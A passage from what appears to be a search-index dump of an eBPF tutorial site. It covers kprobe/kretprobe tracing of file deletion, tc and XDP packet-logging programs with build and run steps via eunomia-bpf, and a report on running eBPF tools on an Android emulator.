callback function may call <code>printk()</code> again, the callback for the <code>printk</code> probe point will not be triggered again. Only the <code>nmissed</code> field in the <code>kprobe</code> structure will be incremented.</li> <li> <p>mutex locks and dynamic memory allocation are not used in the registration and removal process of kprobes.</p> </li> <li> <p>During the execution of kprobes callback functions, kernel preemption is disabled, and it may also be executed with interrupts disabled, which depends on the CPU architecture. Therefore, regardless of the situation, do not call functions that will give up the CPU in the callback function (such as semaphore, mutex lock, etc.);</p> </li> <li>kretprobe is implemented by replacing the return address with the pre-defined trampoline address, so stack backtraces and gcc inline function <code>__builtin_return_address()</code> will return the address of the trampoline instead of the actual return address of the probed function;</li> <li>If the number of function calls and return calls of a function are unequal, registering kretprobe on such a function may not achieve the expected effect, for example, the <code>do_exit()</code> function will have problems, while the <code>do_execve()</code> function and <code>do_fork()</code> function will not;</li> <li>When entering and exiting a function, if the CPU is running on a stack that does not belong to the current task, registering kretprobe on that function may have unpredictable consequences. Therefore, kprobes does not support registering kretprobe for the <code>__switch_to()</code> function under the X86_64 architecture and will directly return <code>-EINVAL</code>.</li> </ol>"},{"location":"tutorials/2-kprobe-unlink/#kprobe-example","title":"kprobe Example","text":"<p>The complete code is as follows:</p> <pre><code>#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nSEC(\"kprobe/do_unlinkat\")\nint BPF_KPROBE(do_unlinkat, int dfd, struct filename *name)\n{\n    pid_t pid;\n    const char *filename;\n\n    pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    filename = BPF_CORE_READ(name, name);\n    bpf_printk(\"KPROBE ENTRY pid = %d, filename = %s\\n\", pid, filename);\n    return 0;\n}\n\nSEC(\"kretprobe/do_unlinkat\")\nint BPF_KRETPROBE(do_unlinkat_exit, long ret)\n{\n    pid_t pid;\n\n    pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    bpf_printk(\"KPROBE EXIT: pid = %d, ret = %ld\\n\", pid, ret);\n    return 0;\n}\n</code></pre> <p>This code is a simple eBPF program used to monitor and capture the unlink system call executed in the Linux kernel. The unlink system call is used to delete a file. This eBPF program traces this system call by placing hooks at the entry and exit points of the <code>do_unlinkat</code> function using a kprobe (kernel probe).</p> <p>First, we import necessary header files such as vmlinux.h, bpf_helpers.h, bpf_tracing.h, and bpf_core_read.h. Then, we define a license to allow the program to run in the kernel.</p> <pre><code>#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n</code></pre> <p>Next, we define a kprobe named <code>BPF_KPROBE(do_unlinkat)</code> which gets triggered when the <code>do_unlinkat</code> function is entered. It takes two parameters: <code>dfd</code> (file descriptor) and <code>name</code> (filename structure pointer). In this kprobe, we retrieve the PID (process identifier) of the current process and then read the filename. Finally, we use the <code>bpf_printk</code> function to print the PID and filename in the kernel log.</p> <pre><code>SEC(\"kprobe/do_unlinkat\")\nint BPF_KPROBE(do_unlinkat, int dfd, struct filename *name)\n{\n    pid_t pid;\n    const char *filename;\n\n    pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    filename = BPF_CORE_READ(name, name);\n    bpf_printk(\"KPROBE ENTRY pid = %d, filename = %s\\n\", pid, filename);\n    return 0;\n}\n</code></pre> <p>Next, we define a kretprobe named <code>BPF_KRETPROBE(do_unlinkat_exit)</code> that will be triggered when exiting the <code>do_unlinkat</code> function. The purpose of this kretprobe is to capture the return value (<code>ret</code>) of the function. We again obtain the PID of the current process and use the <code>bpf_printk</code> function to print the PID and return value in the kernel log.</p> <pre><code>SEC(\"kretprobe/do_unlinkat\")\nint BPF_KRETPROBE(do_unlinkat_exit, long ret)\n{\n    pid_t pid;\n\n    pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    bpf_printk(\"KPROBE EXIT: pid = %d, ret = %ld\\n\", pid, ret);\n    return 0;\n}\n</code></pre> <p>eunomia-bpf is an open-source eBPF dynamic loading runtime and development toolchain that combines with Wasm. Its goal is to simplify the development, build, distribution, and execution of eBPF programs. You can refer to https://github.com/eunomia-bpf/eunomia-bpf to download and install the ecc compiler toolchain and ecli runtime.</p> <p>To compile this program, use the ecc tool:</p> <pre><code>$ ecc kprobe-link.bpf.c\nCompiling bpf object...\nPacking ebpf object and config into package.json...\n</code></pre> <p>Then run:</p> <pre><code>sudo ecli run package.json\n</code></pre> <p>In another window:</p> <pre><code>touch test1\nrm test1\ntouch test2\nrm test2\n</code></pre> <p>You should see kprobe demo output similar to the following in the /sys/kernel/debug/tracing/trace_pipe file:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\n              rm-9346    [005] d..3  4710.951696: bpf_trace_printk: KPROBE ENTRY pid = 9346, filename = test1\n              rm-9346    [005] d..4  4710.951819: bpf_trace_printk: KPROBE EXIT: ret = 0\n              rm-9346    [005] d..3  4710.951852: bpf_trace_printk: KPROBE ENTRY pid = 9346, filename = test2\n              rm-9346    [005] d..4  4710.951895: bpf_trace_printk: KPROBE EXIT: ret = 0\n</code></pre>"},{"location":"tutorials/2-kprobe-unlink/#summary","title":"Summary","text":"<p>In this article's example, we learned how to use eBPF's kprobe and kretprobe to capture the unlink system call. For more examples and detailed development guides, please refer to the official documentation of eunomia-bpf: https://github.com/eunomia-bpf/eunomia-bpf</p> <p>This article is the second part of the introductory eBPF development tutorial. The next article will explain how to use fentry to monitor and capture the unlink system call in eBPF.</p> <p>If you'd like to learn more about eBPF knowledge and practices, you can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and complete tutorials.</p> <p>Share on  Share on </p>"},{"location":"tutorials/20-tc/","title":"eBPF Tutorial by Example 20: tc Traffic Control","text":""},{"location":"tutorials/20-tc/#background","title":"Background","text":"<p>Linux's Traffic Control (tc) subsystem has been present in the kernel for many years. Similar to the relationship between iptables and netfilter, tc includes a user-space tc program and a kernel-level traffic control framework. It is mainly used to control the sending and receiving of packets in terms of rate, sequence, and other aspects. Starting from Linux 4.1, tc has added some new attachment points and supports loading eBPF programs as filters onto these attachment points.</p>"},{"location":"tutorials/20-tc/#overview-of-tc","title":"Overview of tc","text":"<p>From the protocol stack perspective, tc is located at the link layer. Its position has already completed the allocation of sk_buff and is later than xdp. In order to control the sending and receiving of packets, tc uses a queue structure to temporarily store and organize packets. In the tc subsystem, the corresponding data structure and algorithm control mechanism are abstracted as qdisc (Queueing discipline). It exposes two callback interfaces for enqueuing and dequeuing packets externally, and internally hides the implementation of queuing algorithms. In qdisc, we can implement complex tree structures based on filters and classes. Filters are mounted on qdisc or class to implement specific filtering logic, and the return value determines whether the packet belongs to a specific class.</p> <p>When a packet reaches the top-level qdisc, its enqueue interface is called, and the mounted filters are executed one by one until a filter matches successfully. Then the packet is sent to the class pointed to by that filter and enters the qdisc processing process configured by that class. The tc framework provides the so-called classifier-action mechanism, that is, when a packet matches a specific filter, the action mounted by that filter is executed to process the packet, implementing a complete packet classification and processing mechanism.</p> <p>The existing tc provides eBPF with the direct-action mode, which allows an eBPF program loaded as a filter to return values such as <code>TC_ACT_OK</code> as tc actions, instead of just returning a classid like traditional filters and handing over the packet processing to the action module. Now, eBPF programs can be mounted on specific qdiscs to perform packet classification and processing actions.</p>"},{"location":"tutorials/20-tc/#writing-ebpf-programs","title":"Writing eBPF Programs","text":"<pre><code>#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_endian.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\n#define TC_ACT_OK 0\n#define ETH_P_IP 0x0800 /* Internet Protocol packet */\n\n/// @tchook {\"ifindex\":1, \"attach_point\":\"BPF_TC_INGRESS\"}\n/// @tcopts {\"handle\":1, \"priority\":1}\nSEC(\"tc\")\nint tc_ingress(struct __sk_buff *ctx)\n{\n    void *data_end = (void *)(__u64)ctx-&gt;data_end;\n    void *data = (void *)(__u64)ctx-&gt;data;\n    struct ethhdr *l2;\n    struct iphdr *l3;\n\n    if (ctx-&gt;protocol != bpf_htons(ETH_P_IP))\n        return TC_ACT_OK;\n\n    l2 = data;\n    if ((void *)(l2 + 1) &gt; data_end)\n        return TC_ACT_OK;\n\n    l3 = (struct iphdr *)(l2 + 1);\n    if ((void *)(l3 + 1) &gt; data_end)\n        return TC_ACT_OK;\n\n    bpf_printk(\"Got IP packet: tot_len: %d, ttl: %d\", bpf_ntohs(l3-&gt;tot_len), l3-&gt;ttl);\n    return TC_ACT_OK;\n}\n\nchar __license[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>This code defines an eBPF program that can capture and process packets through Linux TC (Transmission Control). In this program, we limit it to capture only IPv4 protocol packets, and then print out the total length and Time-To-Live (TTL) value of the packet using the bpf_printk function.</p> <p>What needs to be noted is that we use some BPF library functions in the code, such as the functions bpf_htons and bpf_ntohs, which are used for conversion between network byte order and host byte order. In addition, we also use some comments to provide additional points and option information for TC. For example, at the beginning of this code, we use the following comments:</p> <pre><code>/// @tchook {\"ifindex\":1, \"attach_point\":\"BPF_TC_INGRESS\"}\n/// @tcopts {\"handle\":1, \"priority\":1}\n</code></pre> <p>These comments tell TC to attach the eBPF program to the ingress attachment point of the network interface, and specify the values of the handle and priority options. You can refer to the introduction in patchwork for tc-related APIs in libbpf.</p> <p>In summary, this code implements a simple eBPF program that captures packets and prints out their information.</p>"},{"location":"tutorials/20-tc/#compilation-and-execution","title":"Compilation and Execution","text":"<p>Compile using a container:</p> <pre><code>docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n</code></pre> <p>Or compile using <code>ecc</code>:</p> <pre><code>$ ecc tc.bpf.c\nCompiling bpf object...\nPacking ebpf object and config into package.json...\n</code></pre> <p>And run using <code>ecli</code>:</p> <pre><code>sudo ecli run ./package.json\n</code></pre> <p>You can view the output of the program in the following way:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\n            node-1254811 [007] ..s1 8737831.671074: 0: Got IP packet: tot_len: 79, ttl: 64\n            sshd-1254728 [006] ..s1 8737831.674334: 0: Got IP packet: tot_len: 79, ttl: 64\n            sshd-1254728 [006] ..s1 8737831.674349: 0: Got IP packet: tot_len: 72, ttl: 64\n            node-1254811 [007] ..s1 8737831.674550: 0: Got IP packet: tot_len: 71, ttl: 64\n</code></pre>"},{"location":"tutorials/20-tc/#summary","title":"Summary","text":"<p>This article introduces how to mount eBPF type filters to the TC traffic control subsystem to achieve queuing processing of link layer packets. Based on the solution provided by eunomia-bpf to pass parameters to libbpf through comments, we can mount our own tc BPF program to the target network device with specified options and use the sk_buff structure of the kernel to filter and process packets.</p> <p>If you want to learn more about eBPF knowledge and practice, you can visit our tutorial code repository https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and complete tutorials.</p>"},{"location":"tutorials/20-tc/#references","title":"References","text":"<ul> <li>http://just4coding.com/2022/08/05/tc/</li> <li>https://arthurchiao.art/blog/understanding-tc-da-mode-zh/</li> </ul> <p>The original link of this article: https://eunomia.dev/tutorials/20-tc</p> <p>Share on  Share on </p>"},{"location":"tutorials/21-xdp/","title":"eBPF Tutorial by Example 21: Programmable Packet Processing with XDP","text":"<p>In this tutorial, we will introduce XDP (eXpress Data Path) and walk through a small example to help you get started. Later on, we will explore more advanced XDP applications, such as load balancers, firewalls, and other real-world use cases. Please give us a start on Github if you are interested in eBPF or XDP!</p>"},{"location":"tutorials/21-xdp/#what-is-xdp","title":"What is XDP?","text":"<p>XDP is a high-performance, programmable data path in the Linux kernel, designed for packet processing at the network interface level. By attaching eBPF programs directly to network device drivers, XDP can intercept and handle packets before they reach the kernel\u2019s networking stack. This allows for extremely low-latency and efficient packet processing, making it ideal for tasks like DDoS defense, load balancing, and traffic filtering. In fact, XDP can achieve throughput as high as 24 million packets per second (Mpps) per core.</p>"},{"location":"tutorials/21-xdp/#why-xdp","title":"Why XDP?","text":"<p>XDP operates at a lower level than traditional Linux networking components, like cBPF (Classic BPF), by running inside the soft interrupt context of the network device driver. It can handle packets before they are even processed by the kernel's standard networking stack, bypassing the creation of the <code>skb_buff</code> structure, which represents network packets in Linux. This early-stage processing provides significant performance gains for simple but frequent operations like dropping malicious packets or load balancing across servers.</p> <p>Compared to other packet processing mechanisms, XDP strikes a balance between performance and usability, leveraging the security and reliability of the Linux kernel while providing flexibility through programmable eBPF.</p>"},{"location":"tutorials/21-xdp/#overview-of-xdp-vs-other-approaches","title":"Overview of XDP vs. Other Approaches","text":"<p>Before XDP, several other solutions aimed to accelerate packet processing by bypassing the kernel entirely. One prominent example is DPDK (Data Plane Development Kit). DPDK allows user-space applications to take direct control of network devices, achieving very high performance. However, this approach comes with trade-offs:</p> <ol> <li> <p>Lack of Kernel Integration: DPDK and other kernel-bypass solutions cannot utilize existing kernel networking features, requiring developers to reimplement many protocols and functions in user space.</p> </li> <li> <p>Security Boundaries: These bypass techniques break the kernel\u2019s security model, making it harder to leverage security tools provided by the kernel.</p> </li> <li> <p>User-Kernel Transition Costs: When user-space packet processing needs to interact with traditional kernel networking (like socket-based applications), packets must be reinjected into the kernel, adding overhead and complexity.</p> </li> <li> <p>Dedicated CPU Usage: To handle high traffic, DPDK and similar solutions often require dedicating one or more CPU cores solely for packet processing, which limits the scalability and efficiency of general-purpose systems.</p> </li> </ol> <p>Another alternative to XDP is using kernel modules or hooks in the Linux networking stack. While this method integrates well with existing kernel features, it requires extensive kernel modifications and does not provide the same performance benefits, as it operates later in the packet processing pipeline.</p>"},{"location":"tutorials/21-xdp/#the-xdp-ebpf-advantage","title":"The XDP + eBPF Advantage","text":"<p>XDP combined with eBPF offers a middle ground between kernel-bypass solutions like DPDK and kernel-integrated solutions. Here\u2019s why XDP + eBPF stands out:</p> <ul> <li> <p>High Performance: By intercepting packets early at the NIC driver level, XDP achieves near-line rate performance for tasks like dropping, redirecting, or load balancing packets, all while keeping resource usage low.</p> </li> <li> <p>Kernel Integration: Unlike DPDK, XDP works within the Linux kernel, allowing seamless interaction with the existing kernel network stack and tools (such as <code>iptables</code>, <code>nftables</code>, or sockets). There\u2019s no need to reimplement networking protocols in user space.</p> </li> <li> <p>Security: The eBPF virtual machine (VM) ensures that user-defined XDP programs are sandboxed and constrained, which means they cannot destabilize the kernel. The security model of eBPF prevents malicious or buggy code from harming the system, providing a safe environment for programmable packet processing.</p> </li> <li> <p>No Dedicated CPUs Required: XDP allows packet processing without dedicating entire CPU cores solely to network tasks. This improves the overall efficiency of the system, allowing for more flexible resource allocation.</p> </li> </ul> <p>In summary, XDP + eBPF delivers a robust solution for programmable packet processing that combines high performance with the flexibility and safety of kernel integration. It eliminates the drawbacks of full kernel-bypass solutions while retaining the benefits of kernel security and functionality.</p>"},{"location":"tutorials/21-xdp/#projects-and-use-cases-with-xdp","title":"Projects and Use Cases with XDP","text":"<p>XDP is already being used in a number of high-profile projects that highlight its power and flexibility in real-world networking scenarios:</p>"},{"location":"tutorials/21-xdp/#1-cilium","title":"1. Cilium","text":"<ul> <li>Description: Cilium is an open-source networking, security, and observability tool designed for cloud-native environments, especially Kubernetes. It leverages XDP to implement high-performance packet filtering and load balancing.</li> <li>Use Case: Cilium offloads packet filtering and security policies to XDP, enabling high-throughput and low-latency traffic management in containerized environments without sacrificing scalability.</li> <li>Link: Cilium</li> </ul>"},{"location":"tutorials/21-xdp/#2-katran","title":"2. Katran","text":"<ul> <li>Description: Katran is a layer 4 load balancer developed by Facebook, optimized for high scalability and performance. It uses XDP to handle packet forwarding with minimal overhead.</li> <li>Use Case: Katran processes millions of packets per second to distribute traffic across backend servers efficiently, using XDP to achieve low-latency and high-performance load balancing in large-scale data centers.</li> <li>Link: Katran GitHub</li> </ul>"},{"location":"tutorials/21-xdp/#3-xdp-ddos-protection-at-cloudflare","title":"3. XDP DDoS Protection at Cloudflare","text":"<ul> <li>Description: Cloudflare has implemented XDP for real-time DDoS mitigation. By processing packets at the NIC level, Cloudflare can filter out attack traffic before it reaches the networking stack, minimizing the impact of DDoS attacks on their systems.</li> <li>Use Case: Cloudflare leverages XDP to drop malicious packets early in the pipeline, protecting their infrastructure from large-scale DDoS attacks while maintaining high availability for legitimate traffic.</li> <li>Link: Cloudflare Blog on XDP</li> </ul> <p>These projects demonstrate the real-world capabilities of XDP for scalable and efficient packet processing across different domains, from security and load balancing to cloud-native networking.</p>"},{"location":"tutorials/21-xdp/#why-use-xdp-over-other-methods","title":"Why Use XDP Over Other Methods?","text":"<p>Compared to traditional methods like <code>iptables</code>, <code>nftables</code>, or <code>tc</code>, XDP offers several clear advantages:</p> <ul> <li> <p>Speed and Low Overhead: Operating directly in the NIC driver, XDP bypasses much of the kernel\u2019s overhead, enabling faster packet processing.</p> </li> <li> <p>Customizability: XDP allows developers to create custom packet-processing programs with eBPF, providing more flexibility and granularity than legacy tools like <code>iptables</code>.</p> </li> <li> <p>Resource Efficiency: XDP does not require dedicating entire CPU cores to packet processing, unlike user-space solutions like DPDK, making it a more efficient choice for high-performance networking.</p> </li> </ul>"},{"location":"tutorials/21-xdp/#writing-your-first-xdp-program","title":"Writing your first XDP Program","text":"<pre><code>#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n\n/// @ifindex 1\n/// @flags 0\n/// @xdpopts {\"old_prog_fd\":0}\nSEC(\"xdp\")\nint xdp_pass(struct xdp_md* ctx) {\n    void* data = (void*)(long)ctx-&gt;data;\n    void* data_end = (void*)(long)ctx-&gt;data_end;\n    int pkt_sz = data_end - data;\n\n    bpf_printk(\"packet size is %d\", pkt_sz);\n    return XDP_PASS;\n}\n\nchar __license[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>This is a kernel-side eBPF code written in C. It captures all packets passing through the target network device using XDP, calculates their size, and outputs it to <code>trace_pipe</code>.</p> <p>It's worth noting the following annotations in the code:</p> <pre><code>/// @ifindex 1\n/// @flags 0\n/// @xdpopts {\"old_prog_fd\":0}\n</code></pre> <p>This functionality is provided by eunomia-bpf, which allows these annotations to inform the eunomia-bpf loader about the desired target network device number, mounting flags, and options for this XDP program.</p> <p>These variables are based on the API provided by libbpf. Detailed information about the interface can be viewed here.</p> <p>The <code>SEC(\"xdp\")</code> macro indicates the type of the BPF program, while <code>ctx</code> is the execution context of this BPF program for packet processing.</p> <p>At the end of the program, we return <code>XDP_PASS</code>, signaling that our XDP program will deliver packets passing through the target network device to the kernel's network protocol stack as usual. For more on XDP actions, see XDP actions.</p>"},{"location":"tutorials/21-xdp/#compilation-and-execution","title":"Compilation and Execution","text":"<p>To compile using a container:</p> <pre><code>docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n</code></pre> <p>Or compile with <code>ecc</code>:</p> <pre><code>$ ecc xdp.bpf.c\nCompiling bpf object...\nPacking ebpf object and config into package.json...\n</code></pre> <p>Then, run with <code>ecli</code>:</p> <pre><code>sudo ecli run package.json\n</code></pre> <p>To view the program's output:</p> <pre><code>$ sudo cat /sys/kernel/tracing/trace_pipe\n            node-1939    [000] d.s11  1601.190413: bpf_trace_printk: packet size is 177\n            node-1939    [000] d.s11  1601.190479: bpf_trace_printk: packet size is 66\n     ksoftirqd/1-19      [001] d.s.1  1601.237507: bpf_trace_printk: packet size is 66\n            node-1939    [000] d.s11  1601.275860: bpf_trace_printk: packet size is 344\n</code></pre>"},{"location":"tutorials/21-xdp/#conclusion","title":"Conclusion","text":"<p>This article introduces how to use XDP to process packets passing through a specific network device. With eunomia-bpf's annotation-based approach for passing parameters to libbpf, we can mount our custom XDP BPF program onto the target device with specified options. This allows packet processing even before they enter the kernel's network protocol stack, achieving high-performance programmable packet processing.</p> <p>For those interested in further exploring eBPF, visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and a comprehensive guide.</p>"},{"location":"tutorials/21-xdp/#references","title":"References","text":"<p>For more information, you can refer to:</p> <ul> <li>http://arthurchiao.art/blog/xdp-paper-acm-2018-zh/</li> <li>http://arthurchiao.art/blog/linux-net-stack-implementation-rx-zh/</li> <li>https://github.com/xdp-project/xdp-tutorial/tree/master/basic01-xdp-pass</li> </ul> <p>The original link of this article: https://eunomia.dev/tutorials/21-xdp</p> <p>Share on  Share on </p>"},{"location":"tutorials/22-android/","title":"eBPF Tutorial by Example: Using eBPF Programs on Android","text":"<p>This article mainly documents the author's exploration process, results, and issues encountered while testing the level of support for CO-RE technology based on the libbpf library on high version Android kernels in the Android Studio Emulator. The test was conducted by building a Debian environment in the Android Shell environment and attempting to build the eunomia-bpf toolchain and run its test cases based on this.</p>"},{"location":"tutorials/22-android/#background","title":"Background","text":"<p>As of now (2023-04), Android has not provided good support for dynamic loading of eBPF programs. Both the compiler distribution scheme represented by bcc and the CO-RE scheme based on btf and libbpf rely heavily on Linux environment support and cannot run well on the Android system.[^WeiShu]</p> <p>However, there have been some successful cases of trying eBPF on the Android platform. In addition to the solution provided by Google to modify <code>Android.bp</code> to build and mount eBPF programs with the entire system[^Google], some people have proposed building a Linux environment based on the Android kernel and running the eBPF toolchain using this approach, and have developed related tools.</p> <p>Currently available information mostly focuses on the testing of bcc and bpftrace toolchains based on the adeb/eadb sandbox built on the Android kernel, with less testing work on the CO-RE scheme. There is more reference material available for using the bcc tool on Android, such as:</p> <ul> <li>SeeFlowerX: https://blog.seeflower.dev/category/eBPF/</li> <li>evilpan: https://bbs.kanxue.com/thread-271043.htm</li> </ul> <p>The main idea is to use chroot to run a Debian image on the Android kernel and build the entire bcc toolchain within it in order to use eBPF tools. The same principle applies to using bpftrace.</p> <p>In fact, higher versions of the Android kernel already support the btf option, which means that the emerging CO-RE technology in the eBPF field should also be applicable to Linux systems based on the Android kernel. This article will test and run eunomia-bpf in the emulator environment based on this.</p> <p>eunomia-bpf is an open-source project that combines libbpf and WebAssembly technology, aiming to simplify the writing, compilation, and deployment of eBPF programs. This project can be seen as a practical way of implementing CO-RE, with libbpf as its core dependency. It is believed that the testing work of eunomia-bpf can provide reference for other CO-RE schemes.</p>"},{"location":"tutorials/22-android/#test-environment","title":"Test Environment","text":"<ul> <li>Android Emulator (Android Studio Flamingo | 2022.2.1)</li> <li>AVD: Pixel 6</li> <li>Android Image: Tiramisu Android 13.0 x86_64 (5.15.41-android13-8-00055-g4f5025129fe8-ab8949913)</li> </ul>"},{"location":"tutorials/22-android/#environment-setupseeflowerx","title":"Environment Setup[^SeeFlowerX]","text":"<ol> <li>Obtain <code>debianfs-amd64-full.tar.gz</code> from the releases page of the eadb repository as the rootfs of the Linux environment. Also, get the <code>assets</code> directory from this project to build the environment.</li> <li>Configure and start the Android Virtual Device in the Android Studio Device Manager.</li> <li>Push <code>debianfs-amd64-full.tar.gz</code> and the <code>assets</code> directory to the AVD using the adb tool from the Android Studio SDK:</li> <li><code>./adb push debianfs-amd64-full.tar.gz /data/local/tmp/deb.tar.gz</code></li> <li><code>./adb push assets /data/local/tmp/assets</code></li> <li>Use adb to enter the Android shell environment and obtain root permissions:</li> <li><code>./adb shell</code></li> <li><code>su</code></li> <li>Build and enter the debian environment in the Android shell:</li> <li><code>mkdir -p /data/eadb</code></li> <li><code>mv /data/local/tmp/assets/* /data/eadb</code></li> <li><code>mv /data/local/tmp/deb.tar.gz /data/eadb/deb.tar.gz</code>+ <code>rm -r /data/local/tmp/assets</code></li> <li><code>chmod +x /data/eadb/device-*</code></li> <li><code>/data/eadb/device-unpack</code></li> <li><code>/data/eadb/run /data/eadb/debian</code></li> </ol> <p>At this point, the Linux environment required for testing eBPF has been set up. In addition, in the Android shell (before entering debian), you can use <code>zcat /proc/config.gz</code> in conjunction with <code>grep</code> to view kernel compilation options.</p> <p>Currently, the debian environment packaged by eadb has a low version of libc and lacks many tool dependencies. Additionally, due to different kernel compilation options, some eBPF features may not be available.</p>"},{"location":"tutorials/22-android/#build-tools","title":"Build Tools","text":"<p>Clone the eunomia-bpf repository into the local debian environment. For the specific build process, refer to the repository's build.md. In this test, I used the <code>ecc</code> compilation method to generate the <code>package.json</code>. Please refer to the repository page for the build and usage instructions for this tool.</p> <p>During the build process, you may need to manually install tools such as <code>curl</code>, <code>pkg-config</code>, <code>libssl-dev</code>, etc.</p>"},{"location":"tutorials/22-android/#results","title":"Results","text":"<p>Some eBPF programs can be successfully executed on Android, but there are also some applications that cannot be executed successfully for various reasons.</p>"},{"location":"tutorials/22-android/#success-cases","title":"Success Cases","text":""},{"location":"tutorials/22-android/#bootstrap","title":"bootstrap","text":"<p>The output of running is as follows:</p> <pre><code>TIME     PID     PPID    EXIT_CODE  DURATION_NS  COMM    FILENAME  EXIT_EVENT\n09:09:19  10217  479     0          0            sh      /system/bin/sh 0\n09:09:19  10217  479     0          0            ps      /system/bin/ps 0\n09:09:19  10217  479     0          54352100     ps                1\n09:09:21  10219  479     0          0            sh      /system/bin/sh 0\n09:09:21  10219  479     0          0            ps      /system/bin/ps 0\n09:09:21  10219  479     0          44260900     ps                1\n</code></pre>"},{"location":"tutorials/22-android/#tcpstates","title":"tcpstates","text":"<p>After starting monitoring, download a web page using <code>wget</code> in the Linux environment:</p> <pre><code>TIME     SADDR   DADDR   SKADDR  TS_US   DELTA_US  PID     OLDSTATE  NEWSTATE  FAMILY  SPORT   DPORT   TASK\n09:07:46  0x4007000200005000000000000f02000a 0x5000000000000f02000a8bc53f77 18446635827774444352 3315344998 0 10115 7 2 2 0 80 wget\n09:07:46  0x40020002d98e50003d99f8090f02000a 0xd98e50003d99f8090f02000a8bc53f77 18446635827774444352 3315465870 120872 0 2 1 2 55694 80 swapper/0\n09:07:46  0x40010002d98e50003d99f8090f02000a 0xd98e50003d99f8090f02000a8bc53f77 18446635827774444352 3315668799 202929 10115 1 4 2 55694 80 wget\n09:07:46  0x40040002d98e50003d99f8090f02000a 0xd98e50003d99f8090f02000a8bc53f77 18446635827774444352 3315670037 1237 0 4 5 2 55694 80 swapper/0\n09:07:46  0x40050002000050003d99f8090f02000a 0x50003d99f8090f02000a8bc53f77 18446635827774444352 3315670225 188 0 5 7 2 55694 80 swapper/0\n09:07:47  0x400200020000bb01565811650f02000a 0xbb01565811650f02000a6aa0d9ac 18446635828348806592 3316433261 0 2546 2 7 2 49970 443 ChromiumNet\n09:07:47  0x400200020000bb01db794a690f02000a 0xbb01db794a690f02000aea2afb8e 18446635827774427776 3316535591 0 1469 2 7 2 37386 443 ChromiumNet\n</code></pre> <p>Start the detection and open the Chrome browser in the Android Studio simulation interface to access the Baidu page:</p> <pre><code>TIME     SADDR   DADDR   SKADDR  TS_US   DELTA_US  PID     OLDSTATE  NEWSTATE  FAMILY  SPORT   DPORT   TASK\n07:46:58  0x400700020000bb01000000000f02000a 0xbb01000000000f02000aeb6f2270 18446631020066638144 192874641 0 3305 7 2 2 0 443 NetworkService\n07:46:58  0x40020002d28abb01494b6ebe0f02000a 0xd28abb01494b6ebe0f02000aeb6f2270 18446631020066638144 192921938 47297 3305 2 1 2 53898 443 NetworkService\n07:46:58  0x400700020000bb01000000000f02000a 0xbb01000000000f02000ae7e7e8b7 18446631020132433920 193111426 0 3305 7 2 2 0 443 NetworkService\n07:46:58  0x40020002b4a0bb0179ff85e80f02000a 0xb4a0bb0179ff85e80f02000ae7e7e8b7 18446631020132433920 193124670 13244 3305 2 1 2 46240 443 NetworkService\n07:46:58  0x40010002b4a0bb0179ff85e80f02000a 0xb4a0bb0179ff85e80f02000ae7e7e8b7 18446631020132433920 193185397 60727 3305 1 4 2 46240 443 NetworkService\n07:46:58  0x40040002b4a0bb0179ff85e80f02000a 0xb4a0bb0179ff85e80f02000ae7e7e8b7 18446631020132433920 193186122 724 3305 4 5 2 46240 443 NetworkService\n07:46:58  0x400500020000bb0179ff85e80f02000a 0xbb0179ff85e80f02000ae7e7e8b7 18446631020132433920 193186244 122 3305 5 7 2 46240 443 NetworkService\".07:46:59  0x40010002d01ebb01d0c52f5c0f02000a 0xd01ebb01d0c52f5c0f02000a51449c27 18446631020103553856 194110884 0 5130 1 8 2 53278 443 ThreadPoolForeg\n07:46:59  0x400800020000bb01d0c52f5c0f02000a 0xbb01d0c52f5c0f02000a51449c27 18446631020103553856 194121000 10116 3305 8 7 2 53278 443 NetworkService\n07:46:59  0x400700020000bb01000000000f02000a 0xbb01000000000f02000aeb6f2270 18446631020099513920 194603677 0 3305 7 2 2 0 443 NetworkService\n07:46:59  0x40020002d28ebb0182dd92990f02000a 0xd28ebb0182dd92990f02000aeb6f2270 18446631020099513920 194649313 45635 12 2 1 2 53902 443 ksoftirqd/0\n07:47:00  0x400700020000bb01000000000f02000a 0xbb01000000000f02000a26f6e878 18446631020132433920 195193350 0 3305 7 2 2 0 443 NetworkService\n07:47:00  0x40020002ba32bb01e0e09e3a0f02000a 0xba32bb01e0e09e3a0f02000a26f6e878 18446631020132433920 195206992 13642 0 2 1 2 47666 443 swapper/0\n07:47:00  0x400700020000bb01000000000f02000a 0xbb01000000000f02000ae7e7e8b7 18446631020132448128 195233125 0 3305 7 2 2 0 443 NetworkService\n07:47:00  0x40020002b4a8bb0136cac8dd0f02000a 0xb4a8bb0136cac8dd0f02000ae7e7e8b7 18446631020132448128 195246569 13444 3305 2 1 2 46248 443 NetworkService\n07:47:00  0xf02000affff00000000000000000000 0x1aca06cffff00000000000000000000 18446631019225912320 195383897 0 947 7 2 10 0 80 Thread-11\n07:47:00  0x40010002b4a8bb0136cac8dd0f02000a 